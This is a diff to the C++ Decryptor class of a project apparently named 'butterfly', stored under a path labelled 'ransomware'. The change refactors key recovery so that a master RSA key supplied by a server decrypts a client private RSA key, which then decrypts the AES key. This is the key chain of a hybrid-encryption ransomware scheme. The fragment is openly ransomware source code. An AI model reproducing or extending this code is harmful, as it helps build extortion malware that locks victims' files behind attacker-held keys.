@@ -3,7 +3,7 @@
 
 namespace butterfly {
 
-Decryptor::Decryptor() : _rsaDecryptorCPrivateRSA(new RSADecryptor("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem")) {
+Decryptor::Decryptor() {
 
 }
 
@@ -11,29 +11,38 @@ Decryptor::~Decryptor() {
 
 }
 
-void Decryptor::decryptCPrivateRSA() {
+std::string Decryptor::decryptCPrivateRSA(const std::string &keyFromServer) {
 
-    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents("CPrivateRSA.bin");
+    _rsaDecryptorCPrivateRSA = std::unique_ptr<RSADecryptor>(new RSADecryptor(keyFromServer));
+
+    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents(CPRIVATERSA_FILENAME);
     EVP_PKEY *cPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();
 
     if ( _rsaDecryptorCPrivateRSA->decrypt(cPrivateRSAPKey, encCPrivateRSA) ) {
         _decryptedCPrivateRSA = _rsaDecryptorCPrivateRSA->getDecryptedKey();
     }
     LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);
-    decryptAESKey();
+    return _decryptedCPrivateRSA;
+
 }
 
-void Decryptor::decryptAESKey() {
+std::string Decryptor::decryptAESKey(const std::string &decryptedCPrivateRSA) {
 
-    _rsaDecryptorAESKey = std::unique_ptr<RSADecryptor>(new RSADecryptor(_decryptedCPrivateRSA));
+    _rsaDecryptorAESKey = std::unique_ptr<RSADecryptor>(new RSADecryptor(decryptedCPrivateRSA));
 
-    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents("AESKey.bin");
+    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents(AES_KEY_ENC_FILENAME);
     EVP_PKEY *aesKeyPKey = _rsaDecryptorAESKey->getEvpPkey();
 
     if ( _rsaDecryptorAESKey->decrypt(aesKeyPKey, encAESKey) ) {
+
         _decryptedAESKey = _rsaDecryptorAESKey->getDecryptedKey();
+        LOG_TRACE("Decrypted AES Key: " << _decryptedAESKey);
+
+    } else {
+        LOG_ERROR("Could not decrypt the AESKey!")
     }
-    LOG_TRACE("Decrypted AES Key: " << _decryptedAESKey);
+
+    return _decryptedAESKey;
 }
 
 } // namespace butterfly
